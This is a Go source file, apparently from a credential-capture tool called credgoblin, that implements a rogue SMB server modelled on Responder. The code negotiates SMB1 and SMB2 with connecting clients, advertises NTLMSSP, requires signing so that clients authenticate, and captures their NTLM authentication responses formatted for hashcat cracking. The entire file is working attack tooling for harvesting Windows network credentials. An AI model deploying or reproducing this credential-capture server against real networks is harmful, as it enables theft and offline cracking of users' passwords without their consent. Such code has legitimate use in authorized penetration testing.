package smb

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"time"

	"github.com/ineffectivecoder/credgoblin/pkg/ntlm"
	"github.com/ineffectivecoder/credgoblin/pkg/output"
)

// Handler handles SMB protocol for a single connection
type Handler struct {
	conn           net.Conn
	config         *Config
	logger         *output.Logger
	challengeGen   *ntlm.Challenge
	authParser     *ntlm.AuthMessageParser
	hashFormatter  *ntlm.HashcatFormatter
	sessionState   *SessionState
	onHashCaptured func(string)
}

// NewHandler creates a new SMB handler
func NewHandler(
	conn net.Conn,
	config *Config,
	logger *output.Logger,
	challengeGen *ntlm.Challenge,
	authParser *ntlm.AuthMessageParser,
	hashFormatter *ntlm.HashcatFormatter,
) *Handler {
	return &Handler{
		conn:          conn,
		config:        config,
		logger:        logger,
		challengeGen:  challengeGen,
		authParser:    authParser,
		hashFormatter: hashFormatter,
		sessionState:  &SessionState{},
	}
}

// OnHashCaptured sets a callback for when a hash is captured
func (h *Handler) OnHashCaptured(callback func(string)) {
	h.onHashCaptured = callback
}

// Handle handles the SMB connection
func (h *Handler) Handle(ctx context.Context) error {
	defer h.conn.Close()

	// Start goroutine to close connection when context is cancelled
	done := make(chan struct{})
	defer close(done)
	go func() {
		select {
		case <-ctx.Done():
			h.conn.Close() // Force close to unblock any pending reads
		case <-done:
		}
	}()

	for {
		netbiosHeader := make([]byte, 4)
		_, err := io.ReadFull(h.conn, netbiosHeader)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return fmt.Errorf("failed to read NetBIOS header: %w", err)
		}

		length := int(netbiosHeader[1])<<16 | int(netbiosHeader[2])<<8 | int(netbiosHeader[3])

		packet := make([]byte, length)
		_, err = io.ReadFull(h.conn, packet)
		if err != nil {
			return fmt.Errorf("failed to read SMB packet: %w", err)
		}

		response, hash, err := h.processPacket(packet)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Error processing packet: %v", err))
			return err
		}

		if hash != "" && h.onHashCaptured != nil {
			h.onHashCaptured(hash)
		}

		if response != nil {
			if err := h.sendResponse(response); err != nil {
				return fmt.Errorf("failed to send response: %w", err)
			}
		}

		if hash != "" {
			return nil
		}
	}
}

// processPacket processes an SMB1 or SMB2 packet
func (h *Handler) processPacket(data []byte) ([]byte, string, error) {
	if len(data) < 4 {
		return nil, "", fmt.Errorf("packet too short")
	}

	// Check for SMB1
	if data[0] == 0xFF && data[1] == 'S' && data[2] == 'M' && data[3] == 'B' {
		// Check if this is a negotiate request
		if len(data) >= 33 && data[4] == SMB_COM_NEGOTIATE {
			// Parse dialects to see if client supports SMB2
			_, dialects, err := ParseSMB1NegotiateRequest(data)
			if err == nil {
				// Check if any SMB2 dialect is advertised
				for i, dialect := range dialects {
					if len(dialect) >= 5 && dialect[:5] == "SMB 2" {
						// Client supports SMB2, send SMB2 negotiate response
						h.logger.Debug(fmt.Sprintf("Client advertised SMB2 (%s), switching to SMB2", dialect))
						return h.buildSMB2NegotiateFromSMB1(data, uint16(i))
					}
				}
			}
		}
		return h.processSMB1Packet(data)
	}

	// Check for SMB2
	if data[0] == 0xFE && data[1] == 'S' && data[2] == 'M' && data[3] == 'B' {
		return h.processSMB2Packet(data)
	}

	return nil, "", fmt.Errorf("invalid SMB magic")
}

// buildSMB2NegotiateFromSMB1 sends an SMB2 negotiate response to an SMB1 client
// This follows Responder's behavior of preferring SMB2
func (h *Handler) buildSMB2NegotiateFromSMB1(smb1Data []byte, dialectIndex uint16) ([]byte, string, error) {
	h.logger.Debug("Sending SMB2 negotiate response to SMB1 client (Responder-style)")

	// Parse SMB1 header to get MID
	smb1Header, _ := ParseSMB1Header(smb1Data)

	// Build minimal SMB2 negotiate response
	response := make([]byte, 128)
	offset := 0

	// SMB2 Header
	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4

	// Structure Size (64)
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2

	// Credit Charge
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2

	// Status
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4

	// Command (SMB2_NEGOTIATE = 0)
	binary.LittleEndian.PutUint16(response[offset:offset+2], SMB2_NEGOTIATE)
	offset += 2

	// Credit
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2

	// Flags (SERVER_TO_REDIR)
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4

	// NextCommand
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4

	// MessageID (use SMB1 MID)
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(smb1Header.MID))
	offset += 8

	// Reserved
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4

	// TreeID
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4

	// SessionID
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0)
	offset += 8

	// Signature (16 bytes)
	offset += 16

	// SMB2 Negotiate Response Body
	// Structure Size (65)
	binary.LittleEndian.PutUint16(response[offset:offset+2], 65)
	offset += 2

	// Security Mode - require signing to force authentication
	binary.LittleEndian.PutUint16(response[offset:offset+2], SMB2_NEGOTIATE_SIGNING_ENABLED|SMB2_NEGOTIATE_SIGNING_REQUIRED)
	offset += 2

	// Dialect Revision (SMB 2.002)
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202)
	offset += 2

	// Reserved
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2

	// Server GUID (16 bytes)
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF,
		0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid)
	offset += 16

	// Capabilities
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4

	// MaxTransactSize
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4

	// MaxReadSize
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4

	// MaxWriteSize
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4

	// SystemTime
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	// ServerStartTime
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	// Build SPNEGO NegTokenInit with NTLMSSP support
	// This tells the client we support NTLM authentication
	securityBlob := []byte{
		0x60, 0x48, // Application 0, length 0x48
		0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, // OID 1.3.6.1.5.5.2 (SPNEGO)
		0xa0, 0x3e, // Context 0
		0x30, 0x3c, // SEQUENCE
		0xa0, 0x0e, // Context 0 (MechTypes)
		0x30, 0x0c, // SEQUENCE
		// NTLMSSP OID 1.3.6.1.4.1.311.2.2.10
		0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a,
		0xa3, 0x2a, // Context 3 (MechListMIC)
		0x30, 0x28, // SEQUENCE
		0xa0, 0x26, // Context 0
		0x1b, 0x24, // GeneralString
		// "not_defined_in_RFC4178@please_ignore"
		0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69,
		0x6e, 0x65, 0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52,
		0x46, 0x43, 0x34, 0x31, 0x37, 0x38, 0x40, 0x70,
		0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67,
		0x6e, 0x6f, 0x72, 0x65,
	}

	// SecurityBufferOffset (points to after this negotiate response structure)
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128))
	offset += 2

	// SecurityBufferLength
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob)))
	offset += 2

	// Reserved2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)

	// Append security blob
	response = append(response[:128], securityBlob...)

	return response, "", nil
}

// processSMB1Packet processes an SMB1 packet
func (h *Handler) processSMB1Packet(data []byte) ([]byte, string, error) {
	header, err := ParseSMB1Header(data)
	if err != nil {
		return nil, "", err
	}

	switch header.Command {
	case SMB_COM_NEGOTIATE:
		h.logger.Debug("Received SMB1_NEGOTIATE")
		// Parse the request to find which dialect they want
		_, dialects, err := ParseSMB1NegotiateRequest(data)
		if err != nil {
			h.logger.Debug(fmt.Sprintf("Failed to parse negotiate: %v", err))
			// Use dialect index 0 as fallback
		}
		dialectIndex := FindBestDialectIndex(dialects)
		if h.config.Verbose {
			for i, d := range dialects {
				h.logger.Debug(fmt.Sprintf("  Dialect %d: %s", i, d))
			}
		}
		h.logger.Debug(fmt.Sprintf("Selected dialect index %d from %d dialects", dialectIndex, len(dialects)))
		response := BuildSMB1NegotiateResponse(header, dialectIndex)
		h.logger.Debug(fmt.Sprintf("Sending negotiate response: %d bytes", len(response)))
		return response, "", nil

	case SMB_COM_SESSION_SETUP_ANDX:
		h.logger.Debug("Received SMB1_SESSION_SETUP_ANDX")
		response, hash, err := HandleSMB1SessionSetup(
			header,
			data,
			h.challengeGen,
			h.authParser,
			h.hashFormatter,
			h.sessionState,
		)
		return response, hash, err

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB1 command: 0x%02x", header.Command))
		return nil, "", fmt.Errorf("unsupported SMB1 command: 0x%02x", header.Command)
	}
}

// processSMB2Packet processes an SMB2 packet
func (h *Handler) processSMB2Packet(data []byte) ([]byte, string, error) {
	header, err := parseNegotiateRequest(data)
	if err != nil {
		return nil, "", err
	}

	switch header.Command {
	case SMB2_NEGOTIATE:
		h.logger.Debug("Received SMB2_NEGOTIATE")
		response := buildNegotiateResponse(header)
		return response, "", nil

	case SMB2_SESSION_SETUP:
		h.logger.Debug("Received SMB2_SESSION_SETUP")
		response, hash, err := handleSessionSetup(
			header,
			data,
			h.challengeGen,
			h.authParser,
			h.hashFormatter,
			h.sessionState,
			h.logger,
		)
		return response, hash, err

	default:
		h.logger.Debug(fmt.Sprintf("Unsupported SMB2 command: 0x%04x", header.Command))
		return nil, "", fmt.Errorf("unsupported SMB2 command: 0x%04x", header.Command)
	}
}

// sendResponse sends an SMB response with NetBIOS header
func (h *Handler) sendResponse(data []byte) error {
	header := make([]byte, 4)
	header[0] = 0x00
	length := len(data)
	header[1] = byte(length >> 16)
	header[2] = byte(length >> 8)
	header[3] = byte(length)

	if _, err := h.conn.Write(header); err != nil {
		return err
	}

	if _, err := h.conn.Write(data); err != nil {
		return err
	}

	return nil
}
